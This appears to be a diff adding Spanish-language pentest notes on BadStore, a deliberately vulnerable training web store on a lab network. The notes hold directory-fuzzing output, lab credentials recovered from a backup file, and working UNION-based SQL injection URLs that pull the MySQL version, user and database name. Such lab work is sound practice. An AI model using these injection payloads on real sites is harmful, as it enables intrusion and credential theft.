@@ -1,0 +1,67 @@
+http://www.bladstore.net/?searchquery=salida&action=search&x=23&y=11 -> sin logears
+
+http://www.bladstore.net/cgi-bin/badstore.cgi?searchquery=admin&action=search&x=24&y=12 -> loguearse
+
+http://www.bladstore.net/cgi-bin/badstore.cgi?searchquery=1000&action=search&x=0&y=0 -> loguear | campo oculto
+
+http://www.bladstore.net/cgi-bin/badstore.cgi?searchquery=1,1,1&action=search&x=0&y=0 
+SELECT itemnum, sdesc, ldesc, price FROM itemdb WHERE 'admin' IN (itemnum,sdesc,ldesc)
+
+
+--------------------------------------------------------------------------------------------------------
+https://www.bladstore.net/cgi-bin/badstore.cgi?searchquery=&action=admin&x=13&y=14
+
+http://zap/OTHER/quickstartlaunch/other/startPage/?apinonce=9cdf5aeb23f9e75&
+
+
+ENCONTRAMOS RUTAS QUE PUEDEN LLEGAR A SER VULNERABLES -> y terminamos sacanado credenciales.
+
+[Status: 301, Size: 306, Words: 19, Lines: 10, Duration: 16ms]
+| URL | http://www.bladstore.net/images
+| --> | http://192.168.100.140/images/
+    * FUZZ: images
+
+[Status: 200, Size: 3583, Words: 728, Lines: 90, Duration: 129ms]
+| URL | http://www.bladstore.net/
+    * FUZZ: 
+
+[Status: 200, Size: 3583, Words: 728, Lines: 90, Duration: 66ms]
+| URL | http://www.bladstore.net/index
+    * FUZZ: index
+
+[Status: 301, Size: 306, Words: 19, Lines: 10, Duration: 145ms]
+| URL | http://www.bladstore.net/backup
+| --> | http://192.168.100.140/backup/
+    * FUZZ: backup
+
+[Status: 200, Size: 1334, Words: 1, Lines: 1, Duration: 389ms]
+| URL | http://www.bladstore.net/favicon
+    * FUZZ: favicon
+
+[Status: 200, Size: 316, Words: 23, Lines: 16, Duration: 441ms]
+| URL | http://www.bladstore.net/robots
+    * FUZZ: robots
+
+CREDENCIALES ENCONTRADAS
+
+1001:am9ldXNlci9wYXNzd29yZC9wbGF0bnVtLzE5Mi4xNjguMTAwLjU2DQo= (joeuser/password/platnum/192.168.100.56)
+1002:a3JvZW1lci9zM0NyM3QvZ29sZC8xMC4xMDAuMTAwLjE= (kroemer/s3Cr3t/gold/10.100.100.1)
+1003:amFuZXVzZXIvd2FpdGluZzRGcmlkYXkvMTcyLjIyLjEyLjE5 (janeuser/waiting4Friday/172.22.12.19)
+1004:a2Jvb2tvdXQvc2VuZG1lYXBvLzEwLjEwMC4xMDAuMjA= (kbookout/sendmeapo/10.100.100.20)
+
+
+
+URL VULNERABLES A SQL INJECTION 
+
+https://www.bladstore.net/cgi-bin/badstore.cgi?searchquery=1000%27%20and%20%271%27=%271%27%20UNION%20ALL%20SELECT%201,%201,%201,%201%20--%20-%20&action=search&x=0&y=0
+
+
+EN BASE A NUESTRO ANALISIS SACAMOS LA VERSION DE LA BASE DE DATOS MYSQL CON AYUDA DE (SELECT @@version)
+
+https://www.bladstore.net/cgi-bin/badstore.cgi?searchquery=1000%27%20and%20%271%27=%271%27%20UNION%20ALL%20SELECT%20(SELECT%20@@version),%201,%201,%201%20--%20-%20&action=search&x=0&y=0
+
+Version Base de datos (SELECT @@version): 4.1.7-standard
+Pudimos sacarnos el usuario (SELECT user()): root@localhost
+Podemos ver el nombre de la base de datos (SELECT database()) : badstoredb 
+
+
